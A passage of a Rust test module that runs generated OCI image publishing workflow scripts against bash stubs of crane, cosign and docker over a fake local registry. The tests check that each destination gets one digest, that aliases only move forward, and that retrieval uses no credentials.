// ---
// relationships:
//   implements: github-release-executor
// ---

// Executed Open Container Initiative publisher recipes moved from
// `executor::workflow::tests`.

    /// The maintained OCI recipes, executed against stubbed registry clients.
    ///
    /// These bodies are shell, and the properties this task is accountable for --
    /// one digest at every destination, aliases that only ever move forward, a
    /// retrieval that used no credential -- are properties of what the shell does,
    /// not of what it says. Asserting the emitted text would restate the recipe
    /// rather than check it, so each scenario runs the derived body with `crane`,
    /// `cosign` and `docker` replaced by stubs over a directory that stands in for
    /// a registry, and reads the observation the recipe wrote.
    mod oci_recipes {
        use super::*;
        use crate::executor::fixture::Workspace;
        use crate::publication::observation::{ObservationState, PublicationObservation};
        use std::path::PathBuf;

        /// Digest of the index the sealed layout carries, over its own bytes.
        ///
        /// The fixture names every manifest by the hash of the manifest, the way
        /// a registry does, so `published` is derived from the bytes the body
        /// pushed rather than asserted by the harness.
        fn index_digest(annotated_version: &str, attested: bool) -> String {
            manifest_digest(&index_manifest(annotated_version, attested))
        }

        fn manifest_digest(manifest: &str) -> String {
            format!("sha256:{:x}", Sha256::digest(manifest.as_bytes()))
        }

        fn index_manifest(annotated_version: &str, attested: bool) -> String {
            let attestations = if attested {
                format!(
                    r#",{{"digest":"{}","annotations":{{"vnd.docker.reference.type":"attestation-manifest","vnd.docker.reference.digest":"sha256:aaaa"}},"platform":{{"os":"unknown","architecture":"unknown"}}}},{{"digest":"sha256:bbbb","platform":{{"os":"linux","architecture":"arm64"}}}},{{"digest":"{}","annotations":{{"vnd.docker.reference.type":"attestation-manifest","vnd.docker.reference.digest":"sha256:bbbb"}},"platform":{{"os":"unknown","architecture":"unknown"}}}}"#,
                    manifest_digest(AMD64_ATTESTATION_MANIFEST),
                    manifest_digest(ARM64_ATTESTATION_MANIFEST),
                )
            } else {
                r#",{"digest":"sha256:bbbb","platform":{"os":"linux","architecture":"arm64"}}"#.to_owned()
            };
            format!(
                r#"{{"schemaVersion":2,"annotations":{{"org.opencontainers.image.version":"{annotated_version}","org.opencontainers.image.title":"example-image"}},"manifests":[{{"digest":"sha256:aaaa","platform":{{"os":"linux","architecture":"amd64"}}}}{attestations}]}}"#
            )
        }

        /// Per-platform attestation manifests a Buildx build attaches.
        const AMD64_ATTESTATION_MANIFEST: &str = concat!(
            r#"{"schemaVersion":2,"layers":[{"digest":"sha256:4444444444444444444444444444444444444444444444444444444444444444","annotations":{"in-toto.io/predicate-type":"https://spdx.dev/Document"}},"#,
            r#"{"digest":"sha256:5555555555555555555555555555555555555555555555555555555555555555","annotations":{"in-toto.io/predicate-type":"https://slsa.dev/provenance/v0.2"}}]}"#
        );
        const ARM64_ATTESTATION_MANIFEST: &str = concat!(
            r#"{"schemaVersion":2,"layers":[{"digest":"sha256:8888888888888888888888888888888888888888888888888888888888888888","annotations":{"in-toto.io/predicate-type":"https://spdx.dev/Document"}},"#,
            r#"{"digest":"sha256:9999999999999999999999999999999999999999999999999999999999999999","annotations":{"in-toto.io/predicate-type":"https://slsa.dev/provenance/v0.2"}}]}"#
        );
        /// Digest the built-subject document records over the built bytes.
        const SUBJECT_DIGEST: &str =
            "sha256:2222222222222222222222222222222222222222222222222222222222222222";
        const SBOM_DIGEST: &str =
            "sha256:4444444444444444444444444444444444444444444444444444444444444444";
        const PROVENANCE_DIGEST: &str =
            "sha256:5555555555555555555555555555555555555555555555555555555555555555";
        const ARM64_SBOM_DIGEST: &str =
            "sha256:8888888888888888888888888888888888888888888888888888888888888888";
        const ARM64_PROVENANCE_DIGEST: &str =
            "sha256:9999999999999999999999999999999999999999999999999999999999999999";
        /// A digest a destination might already hold under the released version.
        const FOREIGN_DIGEST: &str =
            "sha256:6666666666666666666666666666666666666666666666666666666666666666";

        /// One run of one derived publisher body against a stubbed registry.
        struct Recipe {
            workspace: Workspace,
            registry: PathBuf,
            stubs: PathBuf,
            job: String,
            feature: bool,
        }

        /// What running a recipe body produced.
        struct Outcome {
            index_digest: String,
            status: std::process::ExitStatus,
            stderr: String,
            observation: Option<PublicationObservation>,
            registry: PathBuf,
            verified: BTreeMap<String, String>,
            waits: Vec<u64>,
        }

        impl Outcome {
            fn observation(&self) -> &PublicationObservation {
                self.observation
                    .as_ref()
                    .unwrap_or_else(|| panic!("the recipe wrote an observation: {}", self.stderr))
            }

            /// What this job's verification step was told it is verifying.
            ///
            /// Read from the verifier's inputs rather than from the recipe's
            /// own environment, so the comparison does not move with the thing
            /// it is checking: a body that wrote a literal, and an `env:` row
            /// that stopped carrying the routed value, both leave this side of
            /// the assertion where it was.
            fn verified(&self, input: &str) -> &str {
                self.verified
                    .get(input)
                    .unwrap_or_else(|| panic!("the verification step is given {input}"))
            }

            /// Release tags one repository carries, and the digest each resolves.
            ///
            /// A keyless signature is itself published as a tag derived from the
            /// digest it signs, so it is excluded here: it is evidence about a
            /// subject rather than a version or alias a consumer resolves.
            fn tags(&self, repository: &str) -> BTreeMap<String, String> {
                let directory = self
                    .registry
                    .join("tags")
                    .join(repository.replace('/', "_"));
                let Ok(entries) = std::fs::read_dir(&directory) else {
                    return BTreeMap::new();
                };
                entries
                    .map(|entry| {
                        let path = entry.expect("registry entry").path();
                        (
                            path.file_name()
                                .expect("tag")
                                .to_string_lossy()
                                .into_owned(),
                            std::fs::read_to_string(&path).expect("tag digest"),
                        )
                    })
                    .filter(|(tag, _)| !tag.ends_with(".sig"))
                    .collect()
            }

            /// Every credential store a retrieval was performed with.
            fn retrieval_stores(&self) -> Vec<String> {
                std::fs::read_to_string(self.registry.join("docker-config.log"))
                    .unwrap_or_default()
                    .lines()
                    .map(str::to_owned)
                    .collect()
            }
        }

        impl Recipe {
            /// Derive the publish workflow for a two-destination OCI release unit.
            fn new(label: &str, job: &str) -> Self {
                Self::over(two_destination_workspace(label), job, false)
            }

            /// Derive it for a Dev Container Feature published to GHCR.
            fn feature(label: &str) -> Self {
                Self::over(feature_workspace(label), GHCR_JOB, true)
            }

            fn over(workspace: Workspace, job: &str, feature: bool) -> Self {
                converge(workspace.root(), WorkflowRole::Publish);
                let registry = workspace.root().join("registry");
                let stubs = workspace.root().join("stubs");
                std::fs::create_dir_all(registry.join("blobs")).expect("registry directory");
                std::fs::create_dir_all(&stubs).expect("stub directory");
                write_stubs(&stubs);
                Self {
                    workspace,
                    registry,
                    stubs,
                    job: job.to_owned(),
                    feature,
                }
            }

            /// Seed one repository with the versions a destination already carries.
            fn seeded(self, repository: &str, tags: &[(&str, &str)]) -> Self {
                let directory = self
                    .registry
                    .join("tags")
                    .join(repository.replace('/', "_"));
                std::fs::create_dir_all(&directory).expect("seed directory");
                for (tag, digest) in tags {
                    std::fs::write(directory.join(tag), digest).expect("seed tag");
                    // A destination that resolves a digest also serves the
                    // manifest behind it; a recipe that reads what is already
                    // there would otherwise be reading nothing.
                    let foreign = if self.feature {
                        r#"{"schemaVersion":2,"layers":[{"digest":"sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"}]}"#
                    } else {
                        r#"{"schemaVersion":2,"manifests":[{"digest":"sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"}]}"#
                    };
                    std::fs::write(self.registry.join("blobs").join(digest), foreign)
                        .expect("seed manifest");
                }
                self
            }

            /// Run the derived publisher body for one released version.
            fn run(&self, version: &str) -> Outcome {
                self.run_with_annotation(version, version)
            }

            /// Run it with an index annotating a version of its own.
            fn run_with_annotation(&self, version: &str, annotated: &str) -> Outcome {
                self.execute(version, annotated, "", true, SUBJECT_DIGEST)
            }

            /// Run it where one client misbehaved in a named way.
            fn run_with_drift(&self, version: &str, drift: &str) -> Outcome {
                self.execute(version, version, drift, true, SUBJECT_DIGEST)
            }

            /// Run it where the packager attached no attestation at all.
            fn run_unattested(&self, version: &str) -> Outcome {
                self.execute(version, version, "", false, SUBJECT_DIGEST)
            }

            /// Run it against a seal that recorded the given version and digest.
            fn run_with_seal(&self, version: &str, digest: &str) -> Outcome {
                self.execute(version, version, "", true, digest)
            }

            fn execute(
                &self,
                version: &str,
                annotated: &str,
                drift: &str,
                attested: bool,
                digest: &str,
            ) -> Outcome {
                let root = self.workspace.root();
                let temp = root.join("runner-temp");
                let subject = temp.join("intentional_subject");
                let bytes = subject.join("bytes");
                std::fs::create_dir_all(&bytes).expect("subject directory");
                if self.feature {
                    std::fs::write(
                        bytes.join(format!("devcontainer-feature-{FEATURE_ID}.tgz")),
                        "the packaged Feature the build job sealed",
                    )
                    .expect("packaged feature");
                } else {
                    write_layout(&bytes, annotated, attested, drift);
                }

                let step = publish_step(root, &self.job, &temp, version, digest);
                let verified = step.verified.clone();
                let mut publisher = std::process::Command::new("bash");
                publisher
                    .arg("-c")
                    .arg(&step.publisher_run)
                    .current_dir(root.join("component"))
                    .env_clear()
                    .env(
                        "PATH",
                        format!(
                            "{}:{}",
                            self.stubs.display(),
                            test_tool_path(&std::env::var("PATH").unwrap_or_default())
                        ),
                    )
                    .env("HOME", root)
                    .env("RUNNER_TEMP", &temp)
                    .env("FAKE_REGISTRY", &self.registry)
                    .env("FAKE_DRIFT", drift);
                for (name, value) in &step.publisher_env {
                    publisher.env(name, value);
                }
                let mut output = publisher.output().expect("the publisher body runs");
                if output.status.success() {
                    let observer_stubs = verification_stubs(&self.stubs, &temp, &step.installed);
                    let observer_baseline =
                        isolated_observer_baseline(&temp.join("observer-baseline"));
                    let mut observer = std::process::Command::new("bash");
                    observer
                        .arg("-c")
                        .arg(&step.observer_run)
                        .current_dir(root.join("component"))
                        .env_clear()
                        .env(
                            "PATH",
                            format!(
                                "{}:{}",
                                observer_stubs.display(),
                                observer_baseline.display()
                            ),
                        )
                        .env("HOME", root)
                        .env("RUNNER_TEMP", &temp)
                        .env("FAKE_REGISTRY", &self.registry)
                        .env("FAKE_DRIFT", drift);
                    for (name, value) in &step.observer_env {
                        observer.env(name, value);
                    }
                    let observed = observer.output().expect("the observer body runs");
                    output.stderr.extend(observed.stderr);
                    output.stdout.extend(observed.stdout);
                    output.status = observed.status;
                }
                let observation = temp
                    .join("intentional_observation")
                    .join(format!(
                        "{}.yml",
                        self.job.trim_start_matches("intentional_publish_")
                    ))
                    .canonicalize()
                    .ok()
                    .map(|path| {
                        PublicationObservation::load(&path).unwrap_or_else(|error| {
                            panic!("the recipe wrote a loadable observation: {error}")
                        })
                    });
                Outcome {
                    index_digest: index_digest(annotated, attested),
                    status: output.status,
                    stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                    observation,
                    registry: self.registry.clone(),
                    verified,
                    waits: std::fs::read_to_string(self.registry.join("waits.log"))
                        .unwrap_or_default()
                        .lines()
                        .map(|wait| wait.parse().expect("recorded wait is seconds"))
                        .collect(),
                }
            }
        }

        /// One publisher step's shell body and the environment it is given.
        struct PublishStep {
            publisher_run: String,
            publisher_env: BTreeMap<String, String>,
            observer_run: String,
            observer_env: BTreeMap<String, String>,
            installed: BTreeSet<String>,
            /// Inputs the verification step of the same job is given.
            ///
            /// The publication this job performs is named twice by the
            /// derivation, once into the recipe's environment and once into
            /// the verifier's inputs. Reading the second is what lets the
            /// observation's own binding be checked without comparing the
            /// recipe against the thing that fed it.
            verified: BTreeMap<String, String>,
        }

        /// Read the derived publisher step rather than restating it.
        ///
        /// The environment is read from the step's own `env:` mapping, so a value
        /// the derivation stopped routing -- or started spelling differently -- is
        /// absent here rather than supplied by the test.
        fn publish_step(
            root: &Path,
            job: &str,
            temp: &Path,
            version: &str,
            digest: &str,
        ) -> PublishStep {
            let document: Value = serde_yaml::from_str(&workflow(root, WorkflowRole::Publish))
                .expect("workflow parses");
            let steps = document["jobs"][job]["steps"]
                .as_sequence()
                .unwrap_or_else(|| panic!("{job} has steps"));
            let step = steps
                .iter()
                .find(|step| {
                    step["name"]
                        .as_str()
                        .is_some_and(|name| name.starts_with("Publish "))
                })
                .unwrap_or_else(|| panic!("{job} has a publish step"));
            let publisher_env = step["env"]
                .as_mapping()
                .expect("the publish step routes its values through env")
                .iter()
                .map(|(name, value)| {
                    (
                        name.as_str().expect("env name").to_owned(),
                        expression(value.as_str().expect("env value"), temp, version, digest),
                    )
                })
                .collect::<BTreeMap<_, _>>();
            let jobs = document["jobs"].as_mapping().expect("jobs");
            let (_, verification_steps, verify) = publication_verification(jobs, job);
            let observer =
                portable_observer_step(&verify).expect("the Action carries an observer");
            let observer_env = observer["env"]
                    .as_mapping()
                    .expect("observer environment")
                    .iter()
                    .map(|(name, value)| {
                        (
                            name.as_str().expect("env name").to_owned(),
                            expression(
                                value.as_str().expect("env value"),
                                temp,
                                version,
                                digest,
                            ),
                        )
                    })
                    .collect();
            let installed = verification_steps
                .iter()
                .filter_map(observer_client_installed_by)
                .collect();
            let verified = verify["with"]
                .as_mapping()
                .expect("the verification step is given inputs")
                .iter()
                .map(|(name, value)| {
                    (
                        name.as_str().expect("input name").to_owned(),
                        expression(value.as_str().expect("input value"), temp, version, digest),
                    )
                })
                .collect();
            PublishStep {
                publisher_run: step["run"].as_str().expect("publish body").to_owned(),
                publisher_env,
                observer_run: observer["run"].as_str().expect("observer body").to_owned(),
                observer_env,
                installed,
                verified,
            }
        }

        /// Materialize only clients whose installer occurs in the verifier.
        fn verification_stubs(source: &Path, temp: &Path, installed: &BTreeSet<String>) -> PathBuf {
            let destination = temp.join("verification-stubs");
            let _ = std::fs::remove_dir_all(&destination);
            std::fs::create_dir_all(&destination).expect("verification stub directory");
            std::fs::copy(source.join("sleep"), destination.join("sleep"))
                .expect("test clock is available");
            for client in installed {
                let executable = if client == "docker-buildx" {
                    "docker"
                } else {
                    client.as_str()
                };
                std::fs::copy(source.join(executable), destination.join(executable))
                    .unwrap_or_else(|error| panic!("{client} installer provides its stub: {error}"));
            }
            destination
        }

        /// Stand in for the workflow expressions a runner would have resolved.
        ///
        /// The sealed version and digest are the build job's outputs, so they
        /// are resolved as that job's outputs rather than supplied to the body
        /// directly: a recipe that stopped reading them from the seal reads
        /// nothing here.
        fn expression(value: &str, temp: &Path, version: &str, digest: &str) -> String {
            if value.contains(".outputs.version") {
                return version.to_owned();
            }
            if value.contains(".outputs.digest") {
                return digest.to_owned();
            }
            value
                .replace("${{ runner.temp }}", &temp.display().to_string())
                .replace("${{ github.repository_owner }}", "example-owner")
                .replace(
                    "${{ github.repository }}",
                    "example-owner/example-repository",
                )
                .replace("${{ github.actor }}", "example-actor")
                .replace("${{ vars.DOCKERHUB_USERNAME }}", "example-account")
                .replace("${{ secrets.DOCKERHUB_TOKEN }}", "example-token")
                .replace("${{ secrets.GITHUB_TOKEN }}", "example-github-token")
        }

        /// The one release unit this fixture's configuration declares.
        ///
        /// Read from the workspace rather than restated here, so the anchor is
        /// the text an author wrote rather than a second copy of it.
        fn configured_release_unit(root: &Path) -> String {
            let configuration: Value = serde_yaml::from_str(
                &std::fs::read_to_string(root.join(".intentional/config.yml"))
                    .expect("the workspace is configured"),
            )
            .expect("the configuration parses");
            let units = configuration["release-units"]
                .as_mapping()
                .expect("release units")
                .keys()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect::<Vec<_>>();
            let [unit] = units.as_slice() else {
                panic!("this fixture declares one release unit: {units:?}");
            };
            unit.clone()
        }

        /// The sealed OCI layout a build job would have produced.
        fn write_layout(bytes: &Path, annotated_version: &str, attested: bool, drift: &str) {
            let layout = bytes.join("layout");
            let blobs = layout.join("blobs/sha256");
            std::fs::create_dir_all(&blobs).expect("layout directory");
            let index = index_manifest(annotated_version, attested);
            let index_digest = manifest_digest(&index);
            std::fs::write(
                layout.join("index.json"),
                format!(r#"{{"schemaVersion":2,"manifests":[{{"digest":"{index_digest}"}}]}}"#),
            )
            .expect("layout index");
            std::fs::write(
                blobs.join(index_digest.trim_start_matches("sha256:")),
                &index,
            )
            .expect("index manifest");
            for manifest in [AMD64_ATTESTATION_MANIFEST, ARM64_ATTESTATION_MANIFEST] {
                let contents = if drift == "arm64-attestation" && manifest == ARM64_ATTESTATION_MANIFEST {
                    r#"{"schemaVersion":2,"layers":[{"digest":"sha256:9999999999999999999999999999999999999999999999999999999999999999","annotations":{"in-toto.io/predicate-type":"https://slsa.dev/provenance/v0.2"}}]}"#
                } else {
                    manifest
                };
                std::fs::write(
                    blobs.join(manifest_digest(manifest).trim_start_matches("sha256:")),
                    contents,
                )
                .expect("attestation manifest");
            }
            let status = std::process::Command::new("tar")
                .arg("-cf")
                .arg(bytes.join("subject.oci.tar"))
                .arg("-C")
                .arg(&layout)
                .arg(".")
                .status()
                .expect("tar runs");
            assert!(status.success(), "the sealed layout archives");
            std::fs::remove_dir_all(&layout).expect("only the archive travels");
        }

        /// Registry, signing and packager clients a runner would have installed.
        fn write_stubs(directory: &Path) {
            for (name, body) in [
                ("crane", CRANE_STUB),
                ("cosign", COSIGN_STUB),
                ("docker", DOCKER_STUB),
                ("npm", NPM_STUB),
                ("devcontainer", DEV_CONTAINER_STUB),
                ("sleep", SLEEP_STUB),
            ] {
                let path = directory.join(name);
                std::fs::write(&path, body).expect("stub written");
                let status = std::process::Command::new("chmod")
                    .arg("+x")
                    .arg(&path)
                    .status()
                    .expect("chmod runs");
                assert!(status.success(), "{name} is executable");
            }
        }

        const CRANE_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    registry="${FAKE_REGISTRY}"
    mkdir -p "${registry}/tags" "${registry}/blobs"
    slug() { printf '%s' "${1}" | tr '/' '_'; }
    resolve() {
      case "$1" in
        *@sha256:*)
          test -f "${registry}/blobs/${1#*@}"
          printf '%s' "${1#*@}"
          ;;
        *)
          tag="${registry}/tags/$(slug "${1%:*}")/${1##*:}"
          if [ ! -f "${tag}" ]; then printf 'MANIFEST_UNKNOWN: manifest unknown\n' >&2; exit 1; fi
          cat "${tag}"
          ;;
      esac
    }
    case "${1}" in
      auth) cat > /dev/null; printf '%s\n' "$*" >> "${registry}/auth.log" ;;
      version) printf '0.20.2\n' ;;
      ls)
        if [ "${FAKE_DRIFT:-}" = "listing" ]; then
          printf 'UNAVAILABLE: transient registry failure\n' >&2
          exit 1
        fi
        if [ "${FAKE_DRIFT:-}" = "missing-repository" ]; then
          printf 'NAME_UNKNOWN: repository name not known to registry\n' >&2
          exit 1
        fi
        directory="${registry}/tags/$(slug "${2}")"
        if [ -d "${directory}" ]; then ls "${directory}"; fi
        ;;
      digest)
        printf '%s\n' "${DOCKER_CONFIG:-inherited}" >> "${registry}/docker-config.log"
        if [[ "${2}" == *:"${INTENTIONAL_VERSION}" ]]; then
          attempts="${registry}/version-digest-attempts"
          attempt=0
          if [ -f "${attempts}" ]; then attempt=$(cat "${attempts}"); fi
          attempt=$((attempt + 1))
          printf '%s' "${attempt}" > "${attempts}"
          # Without injected absence, attempt 1 is inline publisher verification,
          # attempt 2 is observer retrieval, and attempt 3 is its clean-client
          # re-read. Named drifts count retries; another exact-version probe moves
          # these positions and fails their assertions rather than silently re-aiming.
          case "${FAKE_DRIFT:-}:${attempt}" in
            initially-invisible:2|reread-invisible:3|shared-budget:2|shared-budget:3) exit 1 ;;
          esac
          if [ "${FAKE_DRIFT:-}" = "shared-budget" ] && [ "${attempt}" -ge 5 ]; then exit 1; fi
        fi
        if [ "${FAKE_DRIFT:-}" = "alias-read-error" ] && [[ "${2}" == *:latest ]]; then
          printf 'UNAVAILABLE: transient registry failure\n' >&2
          exit 1
        fi
        if [ "${FAKE_DRIFT:-}" = "private" ] && [ -n "${DOCKER_CONFIG:-}" ]; then
          exit 1
        fi
        if [ "${FAKE_DRIFT:-}" = "public" ] && [ -n "${DOCKER_CONFIG:-}" ]; then
          # A different subject the destination genuinely serves, so every
          # content-addressed check downstream agrees with itself and only the
          # comparison with the published digest can notice.
          alternate='{"schemaVersion":2,"manifests":[{"digest":"sha256:aaaa"}]}'
          alternate_digest="sha256:$(printf '%s' "${alternate}" | sha256sum | cut -d ' ' -f 1)"
          printf '%s' "${alternate}" > "${registry}/blobs/${alternate_digest}"
          printf '%s\n' "${alternate_digest}"
          exit 0
        fi
        resolve "${2}"
        printf '\n'
        ;;
      manifest) cat "${registry}/blobs/$(resolve "${2}")" ;;
      tag)
        directory="${registry}/tags/$(slug "${2%:*}")"
        mkdir -p "${directory}"
        if [ "${FAKE_DRIFT:-}" = "alias" ]; then
          printf '%s' "sha256:6666666666666666666666666666666666666666666666666666666666666666" > "${directory}/${3}"
        else
          resolve "${2}" > "${directory}/${3}"
        fi
        ;;
      push)
        shift
        layout=""; reference=""
        while [ $# -gt 0 ]; do
          case "${1}" in
            --index) ;;
            *) if [ -z "${layout}" ]; then layout="${1}"; else reference="${1}"; fi ;;
          esac
          shift
        done
        stored=""
        for blob in "${layout}"/blobs/sha256/*; do
          hashed="sha256:$(sha256sum < "${blob}" | cut -d ' ' -f 1)"
          cp "${blob}" "${registry}/blobs/${hashed}"
          if [ "sha256:$(basename "${blob}")" = "$(jq -r '.manifests[0].digest' \
            "${layout}/index.json")" ]; then
            stored="${hashed}"
          fi
        done
        test -n "${stored}"
        directory="${registry}/tags/$(slug "${reference%:*}")"
        mkdir -p "${directory}"
        if [ "${FAKE_DRIFT:-}" = "content" ] || [ "${FAKE_DRIFT:-}" = "title" ]; then
          if [ "${FAKE_DRIFT:-}" = "content" ]; then
            filter='.manifests[0].digest = "sha256:eeee"'
          else
            filter='.annotations["org.opencontainers.image.title"] = "other-image"'
          fi
          rewritten="$(jq -c "${filter}" "${registry}/blobs/${stored}")"
          rewritten_digest="sha256:$(printf '%s' "${rewritten}" | sha256sum | cut -d ' ' -f 1)"
          printf '%s' "${rewritten}" > "${registry}/blobs/${rewritten_digest}"
          printf '%s' "${rewritten_digest}" > "${directory}/${reference##*:}"
        elif [ "${FAKE_DRIFT:-}" = "push" ]; then
          cp "${registry}/blobs/${stored}" \
            "${registry}/blobs/sha256:6666666666666666666666666666666666666666666666666666666666666666"
          printf '%s' "sha256:6666666666666666666666666666666666666666666666666666666666666666" > "${directory}/${reference##*:}"
        else
          printf '%s' "${stored}" > "${directory}/${reference##*:}"
        fi
        ;;
      *) printf 'unsupported crane invocation: %s\n' "$*" >&2; exit 2 ;;
    esac
    "#;

        const SLEEP_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$1" >> "${FAKE_REGISTRY}/waits.log"
"#;

        const COSIGN_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    registry="${FAKE_REGISTRY}"
    slug() { printf '%s' "${1}" | tr '/' '_'; }
    case "${1}" in
      sign)
        reference="${3}"
        repository="${reference%@*}"
        directory="${registry}/tags/$(slug "${repository}")"
        mkdir -p "${directory}"
        printf 'sha256:7777777777777777777777777777777777777777777777777777777777777777' \
          > "${directory}/sha256-${reference#*@sha256:}.sig"
        printf '%s\n' "${reference}" >> "${registry}/signed.log"
        ;;
      triangulate)
        reference="${2}"
        printf '%s:sha256-%s.sig\n' "${reference%@*}" "${reference#*@sha256:}"
        ;;
      *) printf 'unsupported cosign invocation: %s\n' "$*" >&2; exit 2 ;;
    esac
    "#;

        const DOCKER_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    printf 'github.com/docker/buildx v0.17.1\n'
    "#;

        const NPM_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
"#;

        /// The Dev Container CLI, which repackages the source and tags it itself.
        const DEV_CONTAINER_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
if [ "${1:-}" = version ]; then printf 'devcontainer 0.88.0\n'; exit 0; fi
registry="${FAKE_REGISTRY}"
slug() { printf '%s' "${1}" | tr '/' '_'; }
version="${INTENTIONAL_VERSION}"
repository="${INTENTIONAL_REGISTRY}/${INTENTIONAL_DESTINATION}"
package="${INTENTIONAL_SUBJECT}/devcontainer-feature-${INTENTIONAL_SUBJECT_IDENTITY}.tgz"
if [ "${FAKE_DRIFT:-}" = "repackage" ]; then
  layer="sha256:9999999999999999999999999999999999999999999999999999999999999999"
else
  layer="sha256:$(sha256sum "${package}" | cut -d ' ' -f 1)"
fi
manifest="$(printf '{"schemaVersion":2,"layers":[{"digest":"%s"}]}' "${layer}")"
digest="sha256:$(printf '%s' "${manifest}" | sha256sum | cut -d ' ' -f 1)"
mkdir -p "${registry}/blobs"
printf '%s' "${manifest}" > "${registry}/blobs/${digest}"
directory="${registry}/tags/$(slug "${repository}")"
mkdir -p "${directory}"
tags="${version}"
case "${version}" in
  *-*)
    if [ "${FAKE_DRIFT:-}" = "prerelease-aliases" ]; then
      core="${version%%-*}"; tags="${tags} ${core%%.*} latest"
    fi ;;
  *)
    tags="${tags} ${version%.*} latest"
    [ "${FAKE_DRIFT:-}" = "stable-missing-alias" ] || tags="${tags} ${version%%.*}"
    ;;
esac
for tag in ${tags}; do
  printf '%s' "${digest}" > "${directory}/${tag}"
done
if [ "${FAKE_DRIFT:-}" = "stable-wrong-alias" ]; then
  printf 'sha256:6666666666666666666666666666666666666666666666666666666666666666' \
    > "${directory}/${version%%.*}"
fi
"#;

        const DOCKERHUB_JOB: &str = "intentional_publish_component_package_oci_dockerhub";
        const GHCR_JOB: &str = "intentional_publish_component_package_oci_ghcr";
        const FEATURE_REPOSITORY: &str = "ghcr.io/example-owner/example-repository/example-feature";
        /// Docker Hub repository the fixture publishes to, registry included.
        ///
        /// The registry host is part of the key the harness stores tags under,
        /// so two destinations of one subject never share a namespace and a
        /// scenario that ran both against one registry could not mistake one
        /// for the other.
        const DOCKERHUB_REPOSITORY: &str = "docker.io/example-owner/example-image";

        /// Both destinations resolve one digest, and neither of them built it.
        #[test]
        fn promotes_the_sealed_layout_to_every_destination_under_one_digest() {
            let mut published = BTreeMap::new();
            for (label, job) in [
                ("oci-promote-dockerhub", DOCKERHUB_JOB),
                ("oci-promote-ghcr", GHCR_JOB),
            ] {
                let recipe = Recipe::new(label, job);
                let outcome = recipe.run("1.2.3");
                assert!(
                    outcome.status.success(),
                    "{job} publishes: {}",
                    outcome.stderr
                );
                let observation = outcome.observation();
                assert_eq!(observation.state, ObservationState::Present);
                let destination = observation.destination.as_ref().expect("a destination");
                published.insert(job, destination.digest.clone());
                assert_eq!(
                    destination.digest, outcome.index_digest,
                    "{job} records the digest the sealed layout carries"
                );
                let subject = observation.subject.as_ref().expect("a subject");
                assert_eq!(
                    subject.digest, SUBJECT_DIGEST,
                    "{job} records the digest the build job sealed over its bytes"
                );
                assert_eq!(subject.identity, "example-image");
            }
            let digests = published.values().collect::<BTreeSet<_>>();
            assert_eq!(
                digests.len(),
                1,
                "every destination resolves the same subject digest: {published:?}"
            );
        }

        /// The recipe records the destination its configuration names.
        ///
        /// An observation also carries the triple that says which publication
        /// it describes, and that binding is the recipe's own to get right: a
        /// body writing another unit's or another target's name produces a
        /// document that loads, validates, and describes the wrong thing.
        /// `accept_observation` would reject it at verification time, two
        /// layers away from the recipe that wrote it.
        ///
        /// The triple is therefore compared against the inputs this job's own
        /// verification step is given rather than against the recipe's `env:`.
        /// Comparing it against `env:` would move both sides together: an
        /// `env:` row that stopped carrying the routed value would produce a
        /// wrong observation that still agreed with the row that wrote it.
        #[test]
        fn records_each_destination_under_its_configured_identity() {
            let dockerhub_recipe = Recipe::new("oci-identity-dockerhub", DOCKERHUB_JOB);
            let dockerhub = dockerhub_recipe.run("1.2.3");
            assert_eq!(
                dockerhub
                    .observation()
                    .destination
                    .as_ref()
                    .expect("destination")
                    .identity,
                "example-owner/example-image",
                "the observation records the repository the configuration names, not the reference the client resolved"
            );
            let ghcr_recipe = Recipe::new("oci-identity-ghcr", GHCR_JOB);
            let ghcr = ghcr_recipe.run("1.2.3");
            assert_eq!(
                ghcr.observation()
                    .destination
                    .as_ref()
                    .expect("destination")
                    .identity,
                "example-owner/example-image",
                "an empty GHCR mapping derives its owner from GitHub and its name from the subject"
            );
            // Both deliveries render from one `@RELEASE_UNIT@` substitution, so
            // their agreeing with each other cannot show that either is the
            // release unit an author configured: a constant in that one place
            // moves both. The third anchor is the configuration file itself.
            let configured = configured_release_unit(dockerhub_recipe.workspace.root());
            assert_eq!(
                dockerhub.verified("release-unit"),
                configured,
                "the job verifies the release unit the configuration names"
            );
            for outcome in [&dockerhub, &ghcr] {
                assert_eq!(
                    outcome.observation().release_unit,
                    outcome.verified("release-unit"),
                    "the observation names the release unit its own job verifies"
                );
                assert_eq!(
                    outcome.observation().target,
                    outcome.verified("target"),
                    "the observation names the target its own job verifies"
                );
            }
            assert_ne!(
                dockerhub.verified("target"),
                ghcr.verified("target"),
                "the two destinations verify different targets, so the binding above tells them apart"
            );
        }

        /// A first stable release takes every alias it is entitled to.
        #[test]
        fn advances_every_compatible_alias_for_the_newest_stable_release() {
            let recipe = Recipe::new("oci-alias-newest", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let tags = outcome.tags(DOCKERHUB_REPOSITORY);
            assert_eq!(
                tags.keys().cloned().collect::<Vec<_>>(),
                vec![
                    "1".to_owned(),
                    "1.2".to_owned(),
                    "1.2.3".to_owned(),
                    "latest".to_owned()
                ]
            );
            assert!(tags.values().all(|digest| *digest == outcome.index_digest));
            let aliases = outcome
                .observation()
                .destination_aliases
                .iter()
                .map(|alias| alias.name.clone())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                aliases,
                BTreeSet::from(["latest".to_owned(), "1.2".to_owned(), "1".to_owned()]),
                "every advanced alias is read back and recorded"
            );
        }

        /// A backport advances its own line and moves nothing backward.
        #[test]
        fn never_moves_an_alias_backward_for_a_backport() {
            let recipe = Recipe::new("oci-alias-backport", DOCKERHUB_JOB).seeded(
                DOCKERHUB_REPOSITORY,
                &[
                    ("1.3.0", FOREIGN_DIGEST),
                    ("1.3", FOREIGN_DIGEST),
                    ("1", FOREIGN_DIGEST),
                    ("latest", FOREIGN_DIGEST),
                ],
            );
            let outcome = recipe.run("1.2.4");
